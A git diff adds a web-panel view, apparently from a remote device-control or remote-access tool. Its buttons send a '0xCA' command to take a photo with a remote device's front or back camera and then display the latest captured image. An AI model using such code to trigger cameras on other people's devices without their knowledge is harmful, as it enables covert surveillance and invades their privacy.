@@ -1,0 +1,151 @@
+
+<div style="display: flex; justify-content: center; flex-direction:column; width: 100%;" class="recent-sales box">
+<!-- 
+    <div class="top-sales box">
+
+
+    </div>
+     -->
+
+    <div class="dropdown">
+        <button style="padding: 7px; background-color: rgb(0, 128, 90); color: white; border-radius: 5px; border-style: none;" class="dropbtn">Snap +</button>
+        <div class="dropdown-content">
+          <button onclick="takePicture1()">
+            <a href="#">Front</a>
+          </button>
+          <button onclick="takePicture2()">
+            <a href="#">Back</a>
+          </button>
+        </div>
+      </div>
+
+      <br>
+
+      <div style="overflow : hidden; width: 100%; height: 600px; border-radius: 20px; box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.527); display: flex; justify-content: center; align-items: center;">
+
+
+        <!-- here implement the path for the latest pic the user took so maybe like photos.path[0] yeh -->
+
+        <img style="max-width:100%;
+        max-height:100%;" src="<%= pageData[pageData.length - 1].path %>" alt="waiting for image...">
+
+
+      </div>
+
+</div>
+
+
+<style>
+    
+    .dropdown {
+      position: relative;
+      display: inline-block;
+    }
+    
+    .dropdown-content {
+      display: none;
+      position: absolute;
+      background-color: #f9f9f9;
+      min-width: 160px;
+      box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+      z-index: 1;
+    }
+    
+    .dropdown-content a {
+      color: black;
+      padding: 12px 16px;
+      text-decoration: none;
+      display: block;
+    }
+    
+    .dropdown-content a:hover {background-color: #f1f1f1}
+    
+    .dropdown:hover .dropdown-content {
+      display: block;
+    }
+    
+    .dropdown:hover .dropbtn {
+      background-color: #3e8e41;
+    }
+    </style>
+
+
+<script>
+
+function getCamList() {
+    sendCommand('0xCA', {
+        action: 'camList',
+    }, (error, message) => {
+        if (error) {
+            setTimeout(() => {
+                showNotification('#f03434', error)
+                console.log(error);
+            }, 300)
+        } else {
+            if (message === 'Requested') {
+                showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                console.log(message + 'd');
+                // setTimeout(() => {
+                //     location.reload();
+                // }, 500)
+            }
+        }
+    })
+}
+
+function takePicture1() {
+    sendCommand('0xCA', {
+        'action': 'takePic',
+        'cameraID' : 1,
+    }, (error, message) => {
+        if (error) {
+            setTimeout(() => {
+                showNotification('#f03434', error)
+                console.log(error);
+            }, 300)
+        } else {
+            if (message === 'Requested') {
+                showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                console.log(message + '-5-');
+                // setTimeout(() => {
+                //     location.reload();
+                // }, 500)
+            }
+        }
+    })
+}
+
+function takePicture2() {
+    sendCommand('0xCA', {
+      'action': 'takePic',
+      'cameraID' : 2,
+    }, (error, message) => {
+        if (error) {
+            setTimeout(() => {
+                showNotification('#f03434', error)
+                console.log(error);
+            }, 300)
+        } else {
+            if (message === 'Requested') {
+                showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                console.log(message + '-5-');
+                // setTimeout(() => {
+                //     location.reload();
+                // }, 500)
+            }
+        }
+    })
+}
+
+$(function() {
+    getCamList()
+
+//     $.post(url, data, function(data,status){
+// 	console.log(data);
+// });
+
+
+});
+
+console.log(pageData);
+</script>
